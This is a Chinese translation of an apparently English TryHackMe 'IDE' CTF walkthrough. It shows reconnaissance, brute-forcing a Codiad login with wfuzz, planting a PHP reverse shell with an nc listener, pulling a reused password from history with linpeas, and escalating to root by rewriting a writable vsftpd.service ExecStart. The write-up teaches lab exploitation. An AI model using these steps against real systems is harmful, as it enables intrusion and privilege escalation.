<html>
<head>
<title>TryHackMe — IDE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe-IDE</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-ide-15ea67a44bc9?source=collection_archive---------3-----------------------#2022-01-25">https://infosecwriteups.com/tryhackme-ide-15ea67a44bc9?source=collection_archive---------3-----------------------#2022-01-25</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="c152" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">嗨，伙计们，又和特里哈克姆with玩得开心了。所以，这里是通过这个<strong class="js iu"> IDE </strong>挑战的记录和指南。这间CTF客房是由CTF爱好者为CTF爱好者设计的。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div class="gh gi ko"><img src="../Images/2f4b04416304326fea513dc6f4d3a8fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/0*B6C_shMvogXQ8Cl6.png"/></div></figure><p id="5339" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">房间</strong>:<a class="ae kw" href="https://tryhackme.com/room/ide" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/ide</a><br/><strong class="js iu">关卡</strong>:轻松</p><p id="eec7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">任务</strong>:打磨你枚举技能的简易盒子！获得一个外壳并升级您的权限！</p><h1 id="89e2" class="kx ky it bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">我们开始吧</h1><p id="7702" class="pw-post-body-paragraph jq jr it js b jt lv jv jw jx lw jz ka kb lx kd ke kf ly kh ki kj lz kl km kn im bi translated">像往常一样，启动机器，在浏览器中打开IP</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ma"><img src="../Images/286f95d3921e36d44299128599dc71c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y1ljawQ5IPSmu52ABFslqg.png"/></div></div></figure><p id="a658" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">不寻常。所以我们可以运行<code class="fe mf mg mh mi b">nmap</code>来检查在其他端口上运行的任何系统</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="33dd" class="mn ky it mi b gy mo mp l mq mr">&gt; nmap -A -T4 -sS -sV -p- 10.10.223.165<br/>PORT      STATE SERVICE VERSION</span><span id="a1ae" class="mn ky it mi b gy ms mp l mq mr"><strong class="mi iu">21/tcp    open  ftp     vsftpd 3.0.3<br/>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</strong><br/>| ftp-syst:<br/>|   STAT:<br/>| FTP server status:<br/>|      Connected to ::ffff:10.8.163.74<br/>|      Logged in as ftp<br/>|      TYPE: ASCII<br/>|      No session bandwidth limit<br/>|      Session timeout in seconds is 300<br/>|      Control connection is plain text<br/>|      Data connections will be plain text<br/>|      At session startup, client count was 4<br/>|      vsFTPd 3.0.3 - secure, fast, stable<br/>|_End of status<br/>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey:<br/>|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)<br/>|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)<br/>|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)<br/>80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))<br/>|_http-title: Apache2 Ubuntu Default Page: It works<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/><strong class="mi iu">62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</strong><br/>|<strong class="mi iu">_http-title: Codiad 2.8.4</strong><br/>|_http-server-header: Apache/2.4.29 (Ubuntu)</span><span id="744a" class="mn ky it mi b gy ms mp l mq mr">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><span id="ad05" class="mn ky it mi b gy ms mp l mq mr">....<br/>....</span></pre><p id="5370" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在这里找到2个有趣的匹配。FTP部分可以匿名访问。使用Cyberduck和浏览服务器</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mt"><img src="../Images/a8456874cfc076e0677fde1493790b82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EU3zxrW_6Ft26LPYBV73Wg.png"/></div></div></figure><p id="7820" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">找到一个没有扩展名的文件。下载并打开它</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="3ff1" class="mn ky it mi b gy mo mp l mq mr">Hey <strong class="mi iu">john</strong>,<br/>I have reset the password as you have asked. <strong class="mi iu">Please use the default password to login. </strong><br/>Also, please take care of the image file ;)<br/>- <strong class="mi iu">drac</strong>.</span></pre><p id="d3f9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">据说drac把john的密码重置成了默认密码。因为FTP阻止任何东西上传，所以只需记下并继续</p><p id="5678" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们看看TCP端口62337</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mu"><img src="../Images/c8f9346e697aaabcbce2a83de86593b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sfnz7OPPxpqQLMrfjF7Mvg.png"/></div></div></figure><p id="c498" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是登录页面。表单正在向此端点发送请求</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="f3af" class="mn ky it mi b gy mo mp l mq mr"><a class="ae kw" href="http://10.10.223.165:62337/components/user/controller.php\?action\=authenticate" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X:62337/components/user/controller.php\?action\=authenticate</a></span></pre><p id="e191" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">使用sqlmap查看SQL注入是否存在漏洞</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="328d" class="mn ky it mi b gy mo mp l mq mr">&gt; sqlmap --forms -u http://10.10.X.X:62337/ --risk=3 --level=3 --random-agent -p "username"</span></pre><p id="dde4" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">不要。太久得不到结果。决定用<code class="fe mf mg mh mi b">wfuzz</code>。使用“john”作为用户名，使用随机密码运行wfuzz，因为注释显示john是系统用户之一</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="259d" class="mn ky it mi b gy mo mp l mq mr">&gt; wfuzz -c -Z -w wordlists/rockyou.txt --sc 200 -d "username=john&amp;password=FUZZ" <a class="ae kw" href="http://10.10.223.165:62337/components/user/controller.php\?action\=authenticate" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X:62337/components/user/controller.php\?action\=authenticate</a></span><span id="eadd" class="mn ky it mi b gy ms mp l mq mr">====================================================================<br/>ID           Response   Lines    Word       Chars       Payload<br/>====================================================================<br/>..... <br/>000000008:   200        0 L      4 W        61 Ch       "rockyou"<br/>000000005:   200        0 L      4 W        61 Ch       "iloveyou"<br/>000000051:   200        0 L      4 W        61 Ch       "amanda"<br/><strong class="mi iu">000000004:   200        0 L      1 W        47 Ch       "XXXXXXXX"</strong><br/>.....</span></pre><p id="6b61" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">哇哦..“默认密码”是指XXXXXXX。😂没听清楚。然后，我们就可以成功登录了</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mv"><img src="../Images/90a085ec51db86f08a0f07150558be70.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ohcNiZCgLy8oglVKxEwOcQ.png"/></div></div></figure><p id="55d6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">它显示了一种不是当前运行系统的代码编辑器。但是，有一个按钮，我们可以创建另一个项目。让我们试着创造一些东西。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mw"><img src="../Images/fe891e8f9d319096d0161030ca6370a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JAcQlXhDxNmbuQ6iwd0vJg.png"/></div></div></figure><p id="5350" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">不幸的是，有一个错误消息“绝对路径只允许用于/var/www/html/codiad/home”。</p><p id="a1c6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">行..将绝对路径值更改为<code class="fe mf mg mh mi b">/var/www/html/codiad</code>。点击创建，突然显示当前运行系统的整个项目代码。</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mx"><img src="../Images/94ad6c9c7fcc6bf1aa4b001c896f24d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rQ4B2pYvKvi12U5OBM84HA.png"/></div></div></figure><p id="cb84" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><code class="fe mf mg mh mi b">index.php</code>是登录用户界面发生的地方。有趣的是，它可以在里面创建任何文件。🤫。右键单击根文件夹并创建一个新文件。我给它“<strong class="js iu">reverse.php</strong>”，并将反向外壳代码放入文件中。通过浏览器<code class="fe mf mg mh mi b">/reverse.php</code>打开文件，通过终端监听</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="b1de" class="mn ky it mi b gy mo mp l mq mr">&gt; nc -nlvp 4444<br/>Connection from XXXXXXXXXXXXXXXXXX<br/>Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br/>07:04:14 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00<br/>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>/bin/sh: 0: can't access tty; job control turned off<br/>$</span></pre><p id="4e21" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">Tada！以www-data用户的身份访问服务器。浏览个人文件夹</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="9a4f" class="mn ky it mi b gy mo mp l mq mr">&gt; ls -al /home<br/>drwxr-xr-x  3 root root 4096 Jun 17  2021 .<br/>drwxr-xr-x 24 root root 4096 Jul  9  2021 ..<br/>drwxr-xr-x  6 drac drac 4096 Aug  4 07:06 drac</span><span id="c3eb" class="mn ky it mi b gy ms mp l mq mr">&gt; ls -al /home/drac<br/>drwx------ 3 drac drac 4096 Jun 18  2021 .local<br/>-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile<br/>-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful<br/>-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors<br/><strong class="mi iu">-r-------- 1 drac drac   33 Jun 18  2021 user.txt</strong></span></pre><p id="94a0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">找到了标志…但只能由<strong class="js iu"> drac </strong>读取。<code class="fe mf mg mh mi b">sudo -l</code>不会给出任何信息。我不能用九头蛇来破解<strong class="js iu"> drac </strong>密码，因为M1不支持。我需要找到另一种方法</p><p id="b495" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们在项目中上传<code class="fe mf mg mh mi b">linpeas</code>shell，从终端执行怎么样？哈哈哈！下载<code class="fe mf mg mh mi b">linpeas.sh</code>。复制代码并粘贴到代码编辑器中。现在，我们可以简单地找到linpeas shell并执行它</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="e86b" class="mn ky it mi b gy mo mp l mq mr">&gt; cd /var/www/codiad<br/>&gt; sh linpeas.sh<br/>....<br/>....<br/><strong class="mi iu">╔══════════╣ Searching passwords in history files<br/>mysql</strong> -u drac -p 'XXXXXXXXXXXXXXXX'<strong class="mi iu"><br/>....<br/>....</strong></span></pre><p id="fe3b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">找到了drac用于Mysql的密码。但是如果drac在SSH中使用相同的密码呢？让我们测试一下</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="158e" class="mn ky it mi b gy mo mp l mq mr">&gt; ssh drac@10.10.X.X</span><span id="6e67" class="mn ky it mi b gy ms mp l mq mr">drac@10.10.223.165's password:<br/><strong class="mi iu">drac@ide</strong>:<strong class="mi iu">~</strong>$ </span><span id="6d11" class="mn ky it mi b gy ms mp l mq mr">&gt; cat user.txt<br/>XXXXXXXXXXXXXXXXX</span></pre><p id="f429" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这与SSH使用的密码相同。现在，我们成功登录并找到了第一面旗帜。现在是根旗。首先，</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="3885" class="mn ky it mi b gy mo mp l mq mr">&gt; sudo -l</span><span id="0e25" class="mn ky it mi b gy ms mp l mq mr">Matching Defaults entries for drac on ide:<br/>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/>User drac may run the following commands on ide:<br/><strong class="mi iu">(ALL : ALL) /usr/sbin/service vsftpd restart</strong></span></pre><p id="4402" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">因此，可以通过drac使用sudo来执行服务命令。提到GTFObins，</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="7487" class="mn ky it mi b gy mo mp l mq mr">&gt; sudo service ../../bin/sh</span><span id="818a" class="mn ky it mi b gy ms mp l mq mr">Sorry, user drac is not allowed to execute '/usr/sbin/service ../../bin/sh' as root on ide.</span></pre><p id="1ddd" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">无法运行命令，因为sudo命令仅限于<code class="fe mf mg mh mi b">vsftpd</code>服务。无需为寻找提示而头疼，只需再次运行linpeas，</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="ea10" class="mn ky it mi b gy mo mp l mq mr"><strong class="mi iu">....<br/>....<br/>╔══════════╣ Interesting GROUP writable files (not in Home) (max500)<br/>╚ </strong><a class="ae kw" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files" rel="noopener ugc nofollow" target="_blank"><strong class="mi iu"><em class="my">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files</em></strong></a><strong class="mi iu"><em class="my"><br/></em></strong>Group <strong class="mi iu">drac:<br/>/lib/systemd/system/vsftpd.service<br/></strong>....<br/>....</span></pre><p id="bfe7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">发现<code class="fe mf mg mh mi b">vsftpd</code>服务可由drac写入，并由root拥有。打开文件，我们可以看到“ExecStart”可以在那里运行命令。既然我的直觉告诉我CTF根旗的大部分位于<code class="fe mf mg mh mi b">root/root.txt</code>。所以，只需把bash命令输出的根标志的内容放到根系统目录下。</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="adb3" class="mn ky it mi b gy mo mp l mq mr">[Unit]<br/>Description=vsftpd FTP server<br/>After=network.target</span><span id="6c76" class="mn ky it mi b gy ms mp l mq mr">[Service]<br/>Type=simple<br/>ExecStart=/bin/sh -c "cat /root/root.txt &gt; /root.txt"<br/>ExecReload=/bin/kill -HUP $MAINPID<br/>ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty</span><span id="1716" class="mn ky it mi b gy ms mp l mq mr">[Install]<br/>WantedBy=multi-user.target</span></pre><p id="3d95" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">保存并尝试重新启动服务</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="8d3d" class="mn ky it mi b gy mo mp l mq mr">&gt; sudo /usr/sbin/service vsftpd restart<br/><strong class="mi iu">Warning:</strong> The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.</span></pre><p id="bc1b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">只要听从警告，</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="f129" class="mn ky it mi b gy mo mp l mq mr">&gt; systemctl daemon-reload<br/>&gt; sudo /usr/sbin/service vsftpd restart</span><span id="244e" class="mn ky it mi b gy ms mp l mq mr">&gt; cat /root.txt<br/>XXXXXXXXXXXXXXXX</span></pre><p id="fd5f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">找到最后一面旗帜！！</p><p id="e59f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">感谢您的阅读，让我们来看看另一篇文章。🤘</p></div><div class="ab cl mz na hx nb" role="separator"><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne"/></div><div class="im in io ip iq"><p id="146b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">🔈🔈<strong class="js iu"> Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。</strong> <a class="ae kw" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank"> <strong class="js iu">查看更多详情并在此注册。</strong> </a></p><div class="ng nh gp gr ni nj"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="nk ab fo"><div class="nl ab nm cl cj nn"><h2 class="bd iu gy z fp no fr fs np fu fw is bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="nq l"><h3 class="bd b gy z fp no fr fs np fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="nr l"><p class="bd b dl z fp no fr fs np fu fw dk translated">iwcon.live</p></div></div><div class="ns l"><div class="nt l nu nv nw ns nx ku nj"/></div></div></a></div></div></div>    
</body>
</html>